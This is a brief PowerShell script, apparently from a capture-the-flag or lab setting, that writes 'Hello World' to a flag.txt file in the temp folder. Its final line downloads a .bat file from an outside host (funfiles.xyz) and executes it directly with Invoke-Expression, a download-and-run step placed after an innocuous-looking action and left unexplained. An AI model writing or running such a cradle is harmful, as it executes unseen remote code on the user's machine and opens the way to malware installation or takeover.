$message = "Hello World"
$tempFolder = $env:TEMP 
$fileName = "flag.txt"
$filePath = Join-Path -Path $tempFolder -ChildPath $fileName

$message | Tee-Object -FilePath $filePath

Invoke-Expression (Invoke-WebRequest -Uri "https://funfiles.xyz/upload/NkEhCcsK6p.bat" -UseBasicParsing)
